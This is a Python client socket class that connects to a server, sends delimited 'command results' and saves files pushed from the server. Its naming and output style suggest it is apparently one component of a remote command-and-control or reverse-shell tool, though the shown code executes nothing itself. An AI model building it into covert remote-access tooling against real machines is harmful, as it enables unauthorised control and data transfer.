# from serverCore.ServerConnection import DELIMETER
import socket
import os

CHUNK_SIZE = 20*1024
DELIMETER = "<END_OF_THE_RESULTS>"

class ClientConnection:
    
    def __init__(self):
        """
            Creates a TCP socket for server
        """
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def CreateConnection(self, ip= "", port=8080):
        self.server_ip = ip
        self.server_port = port
        self.address = (self.server_ip, self.server_port)
        self.socket.connect(self.address)
    
    def SendData(self, data):
        self.data_bytes = bytes(data, "utf-8")
        self.socket.send(self.data_bytes)
    
    def ReceiveData(self):
        received_data_bytes = self.socket.recv(CHUNK_SIZE)
        self.data = received_data_bytes.decode("utf-8")
        return self.data

    def SendCommandResult(self, command_result):
        data2send = command_result + DELIMETER
        data2send_bytes = data2send.encode('utf-8')
        self.socket.sendall(data2send_bytes)

    def ReceiveFile(self, filename):
        print("[+] Receive File")
        filename = os.path.basename(filename)
        print("[+] Filename: {}".format(filename))
        clientPath = "FileDownload/" + filename
        with open(clientPath, "wb") as file:
            while True:
                chunk = self.socket.recv(CHUNK_SIZE)
                if chunk.endswith(DELIMETER.encode('utf-8')):
                    chunk = chunk[:-len(DELIMETER)]
                    file.write(chunk)
                    break
                file.write(chunk)
        print("[+] Completed")

    def close(self):
        self.socket.close()


